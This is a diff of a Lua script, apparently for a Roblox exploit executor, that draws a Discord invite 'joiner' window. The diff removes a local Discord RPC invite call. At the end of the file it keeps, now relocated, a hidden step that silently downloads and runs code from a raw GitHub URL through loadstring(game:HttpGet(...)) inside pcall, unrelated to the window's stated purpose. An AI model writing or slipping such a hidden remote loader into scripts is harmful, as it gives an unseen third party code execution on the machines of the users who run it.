@@ -1,8 +1,3 @@
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/rhuda21/Main/refs/heads/main/Executed.lua"))()
-    end)
-end)
 if not _G.LoadedUBJoiner then _G.LoadedUBJoiner = true end
 local ScreenGui = Instance.new("ScreenGui")
 local JoinerFrame = Instance.new("Frame")
@@ -18,10 +13,8 @@ local ExitButton = Instance.new("TextButton")
 local UICorner_4 = Instance.new("UICorner")
 
 ScreenGui.Name = "DiscordJoiner"
-ScreenGui.Parent = cloneref(gethui()) or game:GetService("CoreGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = (gethui() or cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui"))
 ScreenGui.ResetOnSpawn = false
-ScreenGui.DisplayOrder = 1
 
 JoinerFrame.Name = "JoinerFrame"
 JoinerFrame.Parent = ScreenGui
@@ -97,28 +90,8 @@ ExitButton.AutoButtonColor = false
 UICorner_4.Parent = ExitButton
 UICorner_4.CornerRadius = UDim.new(0, 4)
 
-local function OpenDC(Invite)
-    if request then
-        local success, err = pcall(function()
-            request({
-                Url = 'http://127.0.0.1:6463/rpc?v=1',
-                Method = 'POST',
-                Headers = {
-                    ['Content-Type'] = 'application/json',
-                    Origin = 'https://discord.com'
-                },
-                Body = HttpService:JSONEncode({
-                    cmd = 'INVITE_BROWSER',
-                    nonce = game:GetService("HttpService"):GenerateGUID(false),
-                    args = {code = Invite}
-                })
-            })
-        end)
-    end
-end
 
 local function copyInvite()
-    OpenDC("pn8xyhuSeV")
     local inviteLink = "https://discord.gg/pn8xyhuSeV"
     CopyButton.Text = "Copy"
     CopyButton.BackgroundColor3 = Color3.fromRGB(66, 77, 181)
@@ -174,3 +147,9 @@ for i = 0, 1, 0.05 do
     ExitButton.TextTransparency = 1 - i
     task.wait(0.01)
 end
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rhuda21/Main/refs/heads/main/Executed.lua"))()
+    end)
+end)
